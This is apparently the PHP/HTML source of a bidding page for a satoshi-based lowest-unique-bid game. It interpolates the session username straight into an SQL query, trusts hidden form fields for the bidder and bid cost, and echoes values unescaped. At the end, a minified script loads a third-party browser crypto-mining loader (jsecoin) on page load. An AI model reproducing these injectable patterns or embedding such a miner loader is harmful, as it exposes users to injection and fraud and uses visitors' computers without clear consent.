<?php
$page = "bids";
session_start();
include('config.php');
include('allfun.php');
?>		

<!DOCTYPE html>
<html class="gr__salmen_website" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>Crypto Bids | Play</title>
<link href="https://fonts.googleapis.com/css?family=Josefin+Sans" rel="stylesheet">	
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!-- Bootstrap -->
    <link href="assets/bootstrap.css" rel="stylesheet">
    <link href="assets/style.css" rel="stylesheet">
	<script src="assets/jquery.js"></script>
 <style>
 
 
 .ony{color:#4eae71;}
 input[type="number"]::-webkit-outer-spin-button,
input[type="number"]::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
}
input[type="number"] {
    -moz-appearance: textfield;
}
 body { 
        background: url('bg.jpg') no-repeat center center fixed; 
        -webkit-background-size: cover;
        -moz-background-size: cover;
        -o-background-size: cover;
        background-size: cover;
		font-family: 'Josefin Sans', sans-serif;
    } 
 
 </style>
  </head>
  <body data-gr-c-s-loaded="true" >
   <center> <img src="logo.png" width="150px"></center>
   
   

	
	
        <div class="col-md-2 ">
<?php include ('menu.php') ; ?>
      </div>
	  
	  
	  
      <div class="col-md-8">
        <div class="well content">
		
<h5><b>Bid no <?php echo $bidid; ?></b></h5>
<br>
<center>
<div class="row">

<div class="col-md-5">
<div class="card">
  <img src="btc.png" alt="Avatar" style="width:80%">
  <div class="containera">
	<center>
    <h3 class="ony">Prize : <?php echo $bidamount ; ?> </h3><br>
    <p>Current lowest and unique User <br> <strong class="ony"><?php echo $winner ; ?></strong></p>
	</center>	
  </div>
</div>
</div>

<div class="col-md-7">
<p class="ony">You must bid on lowest and unique number in order to win.</p>
<div class="col-md-12">
<table class="table table-bordered">
<tr>
<th colspan="2" class="ony">Time remaining <b id="demo"></b></th>
</tr>
 <tr>
 <th class="ony">Avaliable Balance</th>
 <th class="ony"><?php echo $balance ; ?> Satoshis</th>
 </tr>
 <tr class="ony"><th colspan="2"><?php echo $bal ; ?></th></tr>
  </tr>
 <tr class="ony"><th colspan="2">1 Bid Cost : <?php echo $bidvalue ; ?></th></tr>
</table>
</div>

	<form method="post" action="bid.php">
				<div class="form-group" label="" for="Address"><strong>Bid Must be between 0.01 to 99.99</strong><br><br>
					<center>
					<div class="row">
						<div class="col-md-4"></div>					
						<div class="col-md-2">
							<input type="number" id="input_box" class="form-control" name="firstval" placeholder="00 to 99" style="width:80px" required> 
						</div>
						<div class="col-md-2">	
							<input type="number" id="input_box1" class="form-control" name="secondval" placeholder="01 to 99" style="width:80px" required>
						</div>		
					</div>
							<input type="hidden" class="form-control" name="user" value="<?php echo $username; ?>">
							<input type="hidden" class="form-control" name="bid" value="<?php echo $bidid; ?>" >
							<input type="hidden" class="form-control" name="bidval" value="<?php echo $bidvalue; ?>" >	
							<br>
								<p><b id="result"></b><b id="result1"></b> </p>
					<script>
	$('#input_box').on('keyup', function() {var my_value = $(this).val(); $('#result').html("Bidding on : "+my_value);});
	$('#input_box1').on('keyup', function() {var my_value1 = $(this).val(); $('#result1').html("."+my_value1);});
	</script>		
							
					</center>				
				</div>
		<button class="btn btn-success" type="submit" name="submit">
      <i class="material-icons" style="font-size:15px">&#xE90E;</i> Bid
    </button>		

		</form> 
	
	
	<br>
<?php echo $msg ; ?>	
<br>	
<?php if($timesbid == 0){
echo '	<div class="alert alert-danger" role="alert" >
		You Dont have Balance. Deposit here <a href="bank.php"><button class="btn btn-success">Wallet</button></a>  		
		</div>';	
}


?>	

	
</div>
</div>
	  <br>
</center>

<h3 class="ony">Your Previous Bids</h3>
<br>
<table class="table table-hover">
 <thead>
	    <tr>
		<th>No.</th>
        <th>Bid Amount</th>
        <th>Time</th>	
		</tr>
 </thead>
 <tbody>
<?php 	
$ss = "SELECT * from bidgame WHERE username = '$username' ORDER by vel DESC " ;
$lgn=mysqli_query($conn,$ss);
$sr = 1;
$count = mysqli_num_rows($lgn);

	 if($count >= 1) {
		 
//echo "Inside count loop";

	 while($ert=mysqli_fetch_array($lgn))
		{
			$bidamountuser = $ert['bidamount'];			
			$veluser = $ert['vel'];
			$usernameaaaa = $ert['username'];
			$veel = getTime($veluser);
echo "
	   <tr>
        <td> ".$sr++ ."</td>
        <td>$bidamountuser</td>
        <td>$veel</td>
      </tr>
";
	 }
//	echo "Out of count loop"; 
	 }else{
//echo "Inside Table loop";		 
echo "			
		<tr>
		<td colspan='3' style='text-align:center'>No bids</td>
		</tr>	
	";		
		}
?>
 </tbody>
</table>


		</div>  
    </div>
		<div class="col-md-2">
		<?php include('menuright.php'); ?>
		</div>		
		<?php include('footer.php'); ?>
	
  <script type="text/javascript">
!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/42376/cryptobids.site/0/0/",s.parentNode.insertBefore(t,s)}();
</script>
    <script src="assets/bootstrap.js"></script>
    <script src="assets/api.js"></script>
  
</body></html>